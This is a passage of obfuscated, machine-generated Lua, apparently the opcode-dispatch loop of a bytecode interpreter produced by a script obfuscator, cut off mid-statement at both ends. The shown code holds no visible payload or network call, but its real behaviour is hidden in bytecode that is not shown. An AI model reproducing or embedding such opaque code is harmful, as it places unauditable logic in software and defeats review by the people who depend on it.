;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];for Idx=Inst[2],Inst[3] do Stk[Idx]=nil;end VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Unpack(Stk,A + 1 ,Top))};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=55) then local B;local A;A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);elseif (Enum>56) then local A;A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];else for Idx=Inst[2],Inst[3] do Stk[Idx]=nil;end end elseif (Enum<=67) then if (Enum<=62) then if (Enum<=59) then if (Enum>58) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end else Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=60) then local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum>61) then local B=Inst[3];local K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;else do return Stk[Inst[2]];end end elseif (Enum<=64) then if (Enum==63) then if (Stk[Inst[2]]==Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end else Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];end elseif (Enum<=65) then local B;local T;local A;Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];T=Stk[A];B=Inst[3];for Idx=1,B do T[Idx]=Stk[A + Idx ];end elseif (Enum==66) then local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];else local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=72) then if (Enum<=69) then if (Enum>68) then if Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end else local A=Inst[2];local Index=Stk[A];local Step=Stk[A + 2 ];if (Step>0) then if (Index>Stk[A + 1 ]) then VIP=Inst[3];else Stk[A + 3 ]=Index;end elseif (Index<Stk[A + 1 ]) then VIP=Inst[3];else Stk[A + 3 ]=Index;end end elseif (Enum<=70) then Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];if (Inst[2]<Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum==71) then Stk[Inst[2]][Stk[Inst[3]]]=Inst[4];else local A;A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];end elseif (Enum<=74) then if (Enum>73) then local A;A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=75) then if (Stk[Inst[2]]~=Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum==76) then local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];else Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];end elseif (Enum<=116) then if (Enum<=96) then if (Enum<=86) then if (Enum<=81) then if (Enum<=79) then if (Enum==78) then local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);else Stk[Inst[2]]=Stk[Inst[3]] + Inst[4] ;end elseif (Enum>80) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local A=Inst[2];local Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;local Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end end elseif (Enum<=83) then if (Enum==82) then local B;local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else Stk[Inst[2]]=Env[Inst[3]];end elseif (Enum<=84) then local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];elseif (Enum==85) then local Edx;local Results;local B;local A;A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local Edx;local Results;local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=91) then if (Enum<=88) then if (Enum>87) then local A=Inst[2];local Results={Stk[A](Unpack(Stk,A + 1 ,Top))};local Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end else local Edx;local Results,Limit;local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=89) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum>90) then local K;local B;Stk[Inst[2]]=Stk[Inst[3]]%Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];do return Stk[Inst[2]];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=93) then if (Enum==92) then Stk[Inst[2]]=Stk[Inst[3]]/Inst[4] ;else local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=94) then local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 